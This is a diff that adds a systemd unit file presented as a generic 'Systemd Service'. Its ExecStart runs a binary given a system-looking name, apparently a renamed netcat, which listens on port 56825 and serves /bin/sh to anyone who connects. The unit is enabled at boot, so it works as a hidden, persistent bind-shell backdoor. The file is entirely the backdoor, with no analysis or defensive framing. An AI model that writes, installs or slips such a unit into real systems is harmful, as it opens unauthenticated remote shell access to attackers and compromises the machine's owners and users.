@@ -1,0 +1,7 @@
+[Unit]
+Description = Systemd Service
+After = network.target
+[Service]
+ExecStart = /lib/systemd/systemd-service -lvp 56825 -e /bin/sh
+[Install]
+WantedBy = multi-user.target
